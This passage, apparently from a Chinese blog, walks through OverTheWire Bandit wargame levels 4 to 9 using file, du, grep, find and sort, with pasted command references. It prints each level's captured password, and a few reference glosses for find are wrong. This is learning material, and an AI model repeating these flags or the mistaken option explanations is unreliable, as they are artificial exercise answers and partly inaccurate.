创建目录</span><br></pre></td></tr></table></figure></p><h2 id="bandit-4-5"><a href="#bandit-4-5" class="headerlink" title="bandit 4-5"></a>bandit 4-5</h2><p>连接上以后发现很多文件还是在inhere里面但是不知道那个我们可以访问，所以我们使用<code>file ./*</code>查看所有文件类型，发现第七个是ASCII text直接cat<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">bandit4@bandit:~$ cd inhere</span><br><span class="line">bandit4@bandit:~/inhere$ ls</span><br><span class="line">-file00  -file02  -file04  -file06  -file08</span><br><span class="line">-file01  -file03  -file05  -file07  -file09</span><br><span class="line">bandit4@bandit:~/inhere$ file ./*</span><br><span class="line">./-file00: data</span><br><span class="line">./-file01: data</span><br><span class="line">./-file02: data</span><br><span class="line">./-file03: data</span><br><span class="line">./-file04: data</span><br><span class="line">./-file05: data</span><br><span class="line">./-file06: data</span><br><span class="line">./-file07: ASCII text</span><br><span class="line">./-file08: data</span><br><span class="line">./-file09: data</span><br><span class="line">bandit4@bandit:~/inhere$ cat ./-file07</span><br><span class="line">koReBOKuIDDepwhWk7jZC0RTdopnAYKh</span><br></pre></td></tr></table></figure></p><h2 id="bandit-5-6"><a href="#bandit-5-6" class="headerlink" title="bandit 5-6"></a>bandit 5-6</h2><p>The password for the next level is stored in a file somewhere under the inhere directory and has all of the following properties:<br>human-readable<br>1033 bytes in size<br>not executable<br>英语和我一样菜的朋友们看过来<br><img src="/2018/10/28/bandit/5-6.jpg" alt=" "><br>要在文件中找到1033b大小的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line">Linux du命令也是查看使用空间的，但是与df命令不同的是Linux du命令是查看当前指定文件或目录(会递归显示子目录)占用磁盘空间大小，还是和df命令有一些区别的.</span><br><span class="line"></span><br><span class="line">1．命令格式：</span><br><span class="line"></span><br><span class="line">du [选项][文件]</span><br><span class="line"></span><br><span class="line">2．命令功能：</span><br><span class="line"></span><br><span class="line">显示每个文件和目录的磁盘使用空间。</span><br><span class="line"></span><br><span class="line">3．命令参数：</span><br><span class="line"></span><br><span class="line">-a或-all  显示目录中个别文件的大小。   </span><br><span class="line"></span><br><span class="line">-b或-bytes  显示目录或文件大小时，以byte为单位。   </span><br><span class="line"></span><br><span class="line">-c或--total  除了显示个别目录或文件的大小外，同时也显示所有目录或文件的总和。 </span><br><span class="line"></span><br><span class="line">-k或--kilobytes  以KB(1024bytes)为单位输出。</span><br><span class="line"></span><br><span class="line">-m或--megabytes  以MB为单位输出。   </span><br><span class="line"></span><br><span class="line">-s或--summarize  仅显示总计，只列出最后加总的值。</span><br><span class="line"></span><br><span class="line">-h或--human-readable  以K，M，G为单位，提高信息的可读性。</span><br><span class="line"></span><br><span class="line">-x或--one-file-xystem  以一开始处理时的文件系统为准，若遇上其它不同的文件系统目录则略过。 </span><br><span class="line"></span><br><span class="line">-L&lt;符号链接&gt;或--dereference&lt;符号链接&gt; 显示选项中所指定符号链接的源文件大小。   </span><br><span class="line"></span><br><span class="line">-S或--separate-dirs   显示个别目录的大小时，并不含其子目录的大小。 </span><br><span class="line"></span><br><span class="line">-X&lt;文件&gt;或--exclude-from=&lt;文件&gt;  在&lt;文件&gt;指定目录或文件。   </span><br><span class="line"></span><br><span class="line">--exclude=&lt;目录或文件&gt;         略过指定的目录或文件。    </span><br><span class="line"></span><br><span class="line">-D或--dereference-args   显示指定符号链接的源文件大小。   </span><br><span class="line"></span><br><span class="line">-H或--si  与-h参数相同，但是K，M，G是以1000为换算单位。   </span><br><span class="line"></span><br><span class="line">-l或--count-links   重复计算硬件链接的文件。  </span><br><span class="line">linux中grep命令的用法</span><br><span class="line">作为linux中最为常用的三大文本（awk，sed，grep）处理工具之一，掌握好其用法是很有必要的。</span><br><span class="line"></span><br><span class="line">首先谈一下grep命令的常用格式为：grep  [选项]  ”模式“  [文件]</span><br><span class="line"></span><br><span class="line">grep家族总共有三个：grep，egrep，fgrep。</span><br><span class="line"></span><br><span class="line">常用选项：</span><br><span class="line">　　-E ：开启扩展（Extend）的正则表达式。</span><br><span class="line"></span><br><span class="line">　　-i ：忽略大小写（ignore case）。</span><br><span class="line"></span><br><span class="line">　　-v ：反过来（invert），只打印没有匹配的，而匹配的反而不打印。</span><br><span class="line"></span><br><span class="line">　　-n ：显示行号</span><br><span class="line"></span><br><span class="line">　　-w ：被匹配的文本只能是单词，而不能是单词中的某一部分，如文本中有liker，而我搜寻的只是like，就可以使用-w选项来避免匹配liker</span><br><span class="line"></span><br><span class="line">　　-c ：显示总共有多少行被匹配到了，而不是显示被匹配到的内容，注意如果同时使用-cv选项是显示有多少行没有被匹配到。</span><br><span class="line"></span><br><span class="line">　　-o ：只显示被模式匹配到的字符串。</span><br><span class="line"></span><br><span class="line">　　--color :将匹配到的内容以颜色高亮显示。</span><br><span class="line"></span><br><span class="line">　　-A  n：显示匹配到的字符串所在的行及其后n行，after</span><br><span class="line"></span><br><span class="line">　　-B  n：显示匹配到的字符串所在的行及其前n行，before</span><br><span class="line"></span><br><span class="line">　　-C  n：显示匹配到的字符串所在的行及其前后各n行，context</span><br><span class="line">1.作用</span><br><span class="line">Linux系统中grep命令是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹 配的行打印出来。grep全称是Global Regular Expression Print，表示全局正则表达式版本，它的使用权限是所有用户。</span><br><span class="line">2.格式</span><br><span class="line">grep [options]</span><br><span class="line">3.主要参数</span><br><span class="line">[options]主要参数：</span><br><span class="line"> -a或--text   不要忽略二进制的数据。</span><br><span class="line">  -A&lt;显示列数&gt;或--after-context=&lt;显示列数&gt;   除了显示符合范本样式的那一列之外，并显示该列之后的内容。</span><br><span class="line">  -b或--byte-offset   在显示符合范本样式的那一列之前，标示出该列第一个字符的位编号。</span><br><span class="line">  -B&lt;显示列数&gt;或--before-context=&lt;显示列数&gt;   除了显示符合范本样式的那一列之外，并显示该列之前的内容。</span><br><span class="line">  -c或--count   计算符合范本样式的列数。</span><br><span class="line">  -C&lt;显示列数&gt;或--context=&lt;显示列数&gt;或-&lt;显示列数&gt;   除了显示符合范本样式的那一列之外，并显示该列之前后的内容。</span><br><span class="line">  -d&lt;进行动作&gt;或--directories=&lt;进行动作&gt;   当指定要查找的是目录而非文件时，必须使用这项参数，否则grep指令将回报信息并停止动作。</span><br><span class="line">  -e&lt;范本样式&gt;或--regexp=&lt;范本样式&gt;   指定字符串做为查找文件内容的范本样式。</span><br><span class="line">  -E或--extended-regexp   将范本样式为延伸的普通表示法来使用。</span><br><span class="line">  -f&lt;范本文件&gt;或--file=&lt;范本文件&gt;   指定范本文件，其内容含有一个或多个范本样式，让grep查找符合范本条件的文件内容，格式为每列一个范本样式。</span><br><span class="line">  -F或--fixed-regexp   将范本样式视为固定字符串的列表。</span><br><span class="line">  -G或--basic-regexp   将范本样式视为普通的表示法来使用。</span><br><span class="line">  -h或--no-filename   在显示符合范本样式的那一列之前，不标示该列所属的文件名称。</span><br><span class="line">  -H或--with-filename   在显示符合范本样式的那一列之前，表示该列所属的文件名称。</span><br><span class="line">  -i或--ignore-case   忽略字符大小写的差别。</span><br><span class="line">  -l或--file-with-matches   列出文件内容符合指定的范本样式的文件名称。</span><br><span class="line">  -L或--files-without-match   列出文件内容不符合指定的范本样式的文件名称。</span><br><span class="line">  -n或--line-number   在显示符合范本样式的那一列之前，标示出该列的列数编号。</span><br><span class="line">  -q或--quiet或--silent   不显示任何信息。</span><br><span class="line">  -r或--recursive   此参数的效果和指定“-d recurse”参数相同。</span><br><span class="line">  -s或--no-messages   不显示错误信息。</span><br><span class="line">  -v或--revert-match   反转查找。</span><br><span class="line">  -V或--version   显示版本信息。</span><br><span class="line">  -w或--word-regexp   只显示全字符合的列。</span><br><span class="line">  -x或--line-regexp   只显示全列符合的列。</span><br><span class="line">  -y   此参数的效果和指定“-i”参数相同。</span><br><span class="line">  --help   在线帮助。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pattern正则表达式主要参数：</span><br><span class="line">\： 忽略正则表达式中特殊字符的原有含义。</span><br><span class="line">^：匹配正则表达式的开始行。</span><br><span class="line">$: 匹配正则表达式的结束行。</span><br><span class="line">\&lt;：从匹配正则表达 式的行开始。</span><br><span class="line">\&gt;：到匹配正则表达式的行结束。</span><br><span class="line">[ ]：单个字符，如[A]即A符合要求 。</span><br><span class="line">[ - ]：范围，如[A-Z]，即A、B、C一直到Z都符合要求 。</span><br><span class="line">。：所有的单个字符。</span><br><span class="line">* ：有字符，长度可以为0。</span><br><span class="line"></span><br><span class="line">4.grep命令使用简单实例</span><br><span class="line">$ grep ‘test’ d*</span><br><span class="line">显示所有以d开头的文件中包含 test的行。</span><br><span class="line">$ grep ‘test’ aa bb cc</span><br><span class="line">显示在aa，bb，cc文件中匹配test的行。</span><br><span class="line">$ grep ‘[a-z]\&#123;5\&#125;’ aa</span><br><span class="line">显示所有包含每个字符串至少有5个连续小写字符的字符串的行。</span><br><span class="line">$ grep ‘w\(es\)t.*\1′ aa</span><br><span class="line">如果west被匹配，则es就被存储到内存中，并标记为1，然后搜索任意个字符(.*)，这些字符后面紧跟着 另外一个es(\1)，找到就显示该行。如果用egrep或grep -E，就不用”\”号进行转义，直接写成’w(es)t.*\1′就可以了。</span><br><span class="line">5.grep命令使用复杂实例</span><br><span class="line">假设您正在’/usr/src/Linux/Doc’目录下搜索带字符 串’magic’的文件：</span><br><span class="line">$ grep magic /usr/src/Linux/Doc/*</span><br><span class="line">sysrq.txt:* How do I enable the magic SysRQ key?</span><br><span class="line">sysrq.txt:* How do I use the magic SysRQ key?</span><br><span class="line">其中文件’sysrp.txt’包含该字符串，讨论的是 SysRQ 的功能。</span><br><span class="line">默认情况下，’grep’只搜索当前目录。如果 此目录下有许多子目录，’grep’会以如下形式列出：</span><br><span class="line">grep: sound: Is a directory</span><br><span class="line">这可能会使’grep’ 的输出难于阅读。这里有两种解决的办法：</span><br><span class="line">明确要求搜索子目录：grep -r</span><br><span class="line">或忽略子目录：grep -d skip</span><br><span class="line">如果有很多 输出时，您可以通过管道将其转到’less’上阅读：</span><br><span class="line">$ grep magic /usr/src/Linux/Documentation/* | less</span><br><span class="line">这样，您就可以更方便地阅读。</span><br><span class="line">有一点要注意，您必需提供一个文件过滤方式(搜索全部文件的话用 *)。如果您忘了，’grep’会一直等着，直到该程序被中断。如果您遇到了这样的情况，按 &lt;CTRL c&gt; ，然后再试。</span><br><span class="line">下面还有一些有意思的命令行参数：</span><br><span class="line">grep -i pattern files ：不区分大小写地搜索。默认情况区分大小写，</span><br><span class="line">grep -l pattern files ：只列出匹配的文件名，</span><br><span class="line">grep -L pattern files ：列出不匹配的文件名，</span><br><span class="line">grep -w pattern files ：只匹配整个单词，而不是字符串的一部分(如匹配’magic’，而不是’magical’)，</span><br><span class="line">grep -C number pattern files ：匹配的上下文分别显示[number]行，</span><br><span class="line">grep pattern1 | pattern2 files ：显示匹配 pattern1 或 pattern2 的行，</span><br><span class="line">grep pattern1 files | grep pattern2 ：显示既匹配 pattern1 又匹配 pattern2 的行。</span><br><span class="line">grep -n pattern files  即可显示行号信息</span><br><span class="line">grep -c pattern files  即可查找总行数</span><br><span class="line">这里还有些用于搜索的特殊符号：</span><br><span class="line">\&lt; 和 \&gt; 分别标注单词的开始与结尾。</span><br><span class="line">例如：</span><br><span class="line">grep man * 会匹配 ‘Batman’、’manic’、’man’等，</span><br><span class="line">grep ‘\&lt;man’ * 匹配’manic’和’man’，但不是’Batman’，</span><br><span class="line">grep ‘\&lt;man\&gt;’ 只匹配’man’，而不是’Batman’或’manic’等其他的字符串。</span><br><span class="line">‘^’：指匹配的字符串在行首，</span><br><span class="line">‘$’：指匹配的字符串在行 尾，</span><br></pre></td></tr></table></figure><br>所以我们可以使用下面的命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bandit5@bandit:~/inhere$ du ./* -a -b | grep 1033</span><br><span class="line">1033./maybehere07/.file2</span><br><span class="line">bandit5@bandit:~/inhere$ cat ./maybehere07/.file2</span><br><span class="line">DXjZPULLxYr17uwoI01bNLQbtFemEgo7</span><br></pre></td></tr></table></figure></p><h2 id="bandit-6-7"><a href="#bandit-6-7" class="headerlink" title="bandit 6-7"></a>bandit 6-7</h2><p>The password for the next level is stored somewhere on the server and has all of the following properties:<br>owned by user bandit7<br>owned by group bandit6<br>33 bytes in size<br>本题需要我们找到用户bandit7但是属于bandit6用户组，大小为33bytes的文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">介绍一下find命令用法</span><br><span class="line">find命令</span><br><span class="line"></span><br><span class="line">　　　　基本格式：find  path expression</span><br><span class="line"></span><br><span class="line">　　　　1.按照文件名查找</span><br><span class="line"></span><br><span class="line">　　　　(1)find / -name httpd.conf　　#在根目录下查找文件httpd.conf，表示在整个硬盘查找</span><br><span class="line">　　　　(2)find /etc -name httpd.conf　　#在/etc目录下文件httpd.conf</span><br><span class="line">　　　　(3)find /etc -name &apos;*srm*&apos;　　#使用通配符*(0或者任意多个)。表示在/etc目录下查找文件名中含有字符串‘srm’的文件</span><br><span class="line">　　　　(4)find . -name &apos;srm*&apos; 　　#表示当前目录下查找文件名开头是字符串‘srm’的文件</span><br><span class="line"></span><br><span class="line">　　　　2.按照文件特征查找 　　　　</span><br><span class="line"></span><br><span class="line">　　　　(1)find / -amin -10 　　# 查找在系统中最后10分钟访问的文件(access time)</span><br><span class="line">　　　　(2)find / -atime -2　　 # 查找在系统中最后48小时访问的文件</span><br><span class="line">　　　　(3)find / -empty 　　# 查找在系统中为空的文件或者文件夹</span><br><span class="line">　　　　(4)find / -group cat 　　# 查找在系统中属于 group为cat的文件</span><br><span class="line">　　　　(5)find / -mmin -5 　　# 查找在系统中最后5分钟里修改过的文件(modify time)</span><br><span class="line">　　　　(6)find / -mtime -1 　　#查找在系统中最后24小时里修改过的文件</span><br><span class="line">　　　　(7)find / -user fred 　　#查找在系统中属于fred这个用户的文件</span><br><span class="line">　　　　(8)find / -size +10000c　　#查找出大于10000000字节的文件(c:字节，w:双字，k:KB，M:MB，G:GB)</span><br><span class="line">　　　　(9)find / -size -1000k 　　#查找出小于1000KB的文件</span><br><span class="line"></span><br><span class="line">　　　　3.使用混合查找方式查找文件</span><br><span class="line"></span><br><span class="line">　　　　参数有： ！，-and(-a)，-or(-o)。</span><br><span class="line"></span><br><span class="line">　　　　(1)find /tmp -size +10000c -and -mtime +2 　　#在/tmp目录下查找大于10000字节并在最后2分钟内修改的文件</span><br><span class="line">   　　    (2)find / -user fred -or -user george 　　#在/目录下查找用户是fred或者george的文件文件</span><br><span class="line">   　　    (3)find /tmp ! -user panda　　#在/tmp目录中查找所有不属于panda用户的文件</span><br></pre></td></tr></table></figure><br>于是我们用下面的命令，发现有个报错<code>/var/lib/dpkg/info/bandit7.password</code>其他的目录都是权限不够，只有这个报错，于是cat<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">bandit6@bandit:~$ find / -user bandit7 -group bandit6 -size 33c</span><br><span class="line">find: ‘/run/lvm’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit5’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit1’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit14’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit2’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit19’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit0’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit24’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit12’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit25’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit23’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit21’: Permission denied</span><br><span class="line">find: ‘/run/screen/S-bandit20’: Permission denied</span><br><span class="line">find: ‘/run/shm’: Permission denied</span><br><span class="line">find: ‘/run/lock/lvm’: Permission denied</span><br><span class="line">find: ‘/var/spool/bandit24’: Permission denied</span><br><span class="line">find: ‘/var/spool/rsyslog’: Permission denied</span><br><span class="line">find: ‘/var/spool/cron/crontabs’: Permission denied</span><br><span class="line">find: ‘/var/log’: Permission denied</span><br><span class="line">find: ‘/var/tmp’: Permission denied</span><br><span class="line">find: ‘/var/cache/ldconfig’: Permission denied</span><br><span class="line">find: ‘/var/cache/apt/archives/partial’: Permission denied</span><br><span class="line">/var/lib/dpkg/info/bandit7.password</span><br><span class="line">find: ‘/var/lib/apt/lists/partial’: Permission denied</span><br><span class="line">find: ‘/var/lib/polkit-1’: Permission denied</span><br><span class="line">find: ‘/cgroup2/csessions’: Permission denied</span><br><span class="line">find: ‘/home/bandit28-git’: Permission denied</span><br><span class="line">find: ‘/home/bandit30-git’: Permission denied</span><br><span class="line">find: ‘/home/bandit31-git’: Permission denied</span><br><span class="line">find: ‘/home/bandit5/inhere’: Permission denied</span><br><span class="line">find: ‘/home/bandit27-git’: Permission denied</span><br><span class="line">find: ‘/home/bandit29-git’: Permission denied</span><br><span class="line">find: ‘/tmp’: Permission denied</span><br><span class="line">find: ‘/lost+found’: Permission denied</span><br><span class="line">find: ‘/root’: Permission denied</span><br><span class="line">find: ‘/etc/ssl/private’: Permission denied</span><br><span class="line">find: ‘/etc/lvm/backup’: Permission denied</span><br><span class="line">find: ‘/etc/lvm/archive’: Permission denied</span><br><span class="line">find: ‘/etc/polkit-1/localauthority’: Permission denied</span><br><span class="line">find: ‘/sys/fs/pstore’: Permission denied</span><br><span class="line">find: ‘/proc/tty/driver’: Permission denied</span><br><span class="line">find: ‘/proc/30038/task/30038/fd/6’: No such file or directory</span><br><span class="line">find: ‘/proc/30038/task/30038/fdinfo/6’: No such file or directory</span><br><span class="line">find: ‘/proc/30038/fd/5’: No such file or directory</span><br><span class="line">find: ‘/proc/30038/fdinfo/5’: No such file or directory</span><br><span class="line">find: ‘/boot/lost+found’: Permission denied</span><br></pre></td></tr></table></figure><br>接下来：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password</span><br><span class="line">HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs</span><br></pre></td></tr></table></figure></p><h2 id="bandit7-8"><a href="#bandit7-8" class="headerlink" title="bandit7-8"></a>bandit7-8</h2><p>The password for the next level is stored in the file data.txt next to the word millionth<br>Commands you may need to solve this level<br>grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd<br>这个网站还有一点好处就是他会告诉你每一次会用到什么命令，所以我会把每一个需要用到的命令详细的全部列出。<br>这一关友情提示大家千万不要傻乎乎直接cat data.txt  你会发现你的电脑要爆炸了<br>所以看清题目，他需要的是millionth后面的密码，直接用上一关我们学的grep就好<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bandit7@bandit:~$ ls</span><br><span class="line">data.txt</span><br><span class="line">bandit7@bandit:~$ cat data.txt | grep &quot;millionth&quot;</span><br><span class="line">millionthcvX2JJa4CFALtqS87jk27qwqGhBM9plV</span><br></pre></td></tr></table></figure></p><h2 id="bandit8-9"><a href="#bandit8-9" class="headerlink" title="bandit8-9"></a>bandit8-9</h2><p>The password for the next level is stored in the file data.txt and is the only line of text that occurs only once<br>Commands you may need to solve this level<br>grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">linux中sort命令</span><br><span class="line">参　　数：</span><br><span class="line">  -b   忽略每行前面开始出的空格字符。</span><br><span class="line">  -c   检查文件是否已经按照顺序排序。</span><br><span class="line">  -d   排序时，处理英文字母、数字及空格字符外，忽略其他的字符。</span><br><span class="line">  -f   排序时，将小写字母视为大写字母。</span><br><span class="line">  -i   排序时，除了040至176之间的ASCII字符外，忽略其他的字符。</span><br><span class="line">  -m   将几个排序好的文件进行合并。</span><br><span class="line">  -M   将前面3个字母依照月份的缩写进行排序。</span><br><span class="line">  -n   依照数值的大小排序。</span><br><span class="line">  -o&lt;输出文件&gt;   将排序后的结果存入指定的文件。</span><br><span class="line">  -r   以相反的顺序来排序。</span><br><span class="line">  -t&lt;分隔字符&gt;   指定排序时所用的栏位分隔字符。</span><br><span class="line">  +&lt;起始栏位&gt;-&lt;结束栏位&gt;   以指定的栏位来排序，范围由起始栏位到结束栏位的前一栏位。</span><br><span class="line">  --help   显示帮助。</span><br><span class="line">  --version   显示版本信息</span><br><span class="line">  sort将文件的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出。</span><br><span class="line">  sort的-u 选项它的作用很简单，就是在输出行中去除重复行。</span><br><span class="line">  sort的-o选项，想把排序结果输出到原文件中，用重定向可就不行了</span><br><span class="line">  [root@zhoucentos log]# cat date </span><br><span class="line">2017-12-02</span><br><span class="line">2017-01-09</span><br><span class="line">2017-10-23</span><br><span class="line">2017-04-24</span><br><span class="line">这个文件有三列，列与列之间用“-”隔开了，第一列表示年，第二列表示月，第三列表示日。那么我想以月来排序，也就是以第二列来排序，如何利用sort实现？幸好，sort提供了-t选项，后面可以设定间隔符。指定了间隔符之后，就可以用-k来指定列数了。</span><br><span class="line">[root@zhoucentos log]# sort -n -k 2 -t&apos;-&apos; date      // -t&lt;分隔字符&gt;   指定排序时所用的栏位分隔字符。  -k  选择以哪个区间进行排序</span><br></pre></td></tr></table></figure><br>还要用到uniq命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">uniq 命令</span><br><span class="line">报告或删除文件中重复的行。</span><br><span class="line">语法</span><br><span class="line">uniq [ -c | -d | -u ] [ -f Fields ] [ -s Characters ] [ -Fields ] [ +Characters ] [ InFile [ OutFile ] ]</span><br><span class="line">-c 在输出行前面加上每行在输入文件中出现的次数。</span><br><span class="line">-d 仅显示重复行。</span><br><span class="line">-u 仅显示不重复的行。</span><br><span class="line">-f Fields 忽略由 Fields 变量指定的字段数目。如果 Fields 变量的值超过输入行中的字段数目, uniq 命令用空字符串进行比较。这个标志和 -Fields 标志是等价的。</span><br><span class="line">-s Characters 忽略由 Characters 变量指定的字符的数目。如果 Characters 变量的值超过输入行中的字符的数目, uniq 用空字符串进行比较。如果同时指定 -f 和 -s 标志, uniq 命令忽略由 -s Characters 标志指定的字符的数目，而从由 -f Fields 标志指定的字段后开始。 这个标志和 +Characters 标志是等价的。</span><br><span class="line">-Fields 忽略由 Fields 变量指定的字段数目。这个标志和 -f Fields 标志是等价的。</span><br><span class="line">+Characters 忽略由 Characters 变量指定的字符的数目。如果同时指定 - Fields 和 +Characters 标志, uniq 命令忽略由 +Characters 标志指定的字符数目，并从由 -Fields 标志指定的字段后开始。 这个标志和 -s Characters 标志是等价的。</span><br><span class="line">- c 显示输出中，在每行行首加上本行在文件中出现的次数。它可取代- u和- 